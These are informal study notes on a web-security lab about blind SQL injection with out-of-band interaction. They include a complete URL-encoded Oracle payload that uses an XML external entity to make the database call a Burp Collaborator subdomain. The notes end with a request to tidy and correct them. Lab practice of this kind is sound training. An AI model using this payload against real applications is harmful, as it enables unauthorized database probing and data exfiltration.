Blind-SQLI-With-Out-Of-Bound-interaction

in this lab we have to trigger the dns lookup to solve the lab.

to do this we need to use the burp suit professional version which is paid.

so first we open the burp suite community version and get the lab url packet and foraward it to repeater. then we take the payload:
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

after the cookie we append this above querry and then we hit send. after that in the professional version we can see that the dns lookup was activated and hence the lab was solved

plz make this into proper notes and details where necessary and correct where i am wrong in this notes
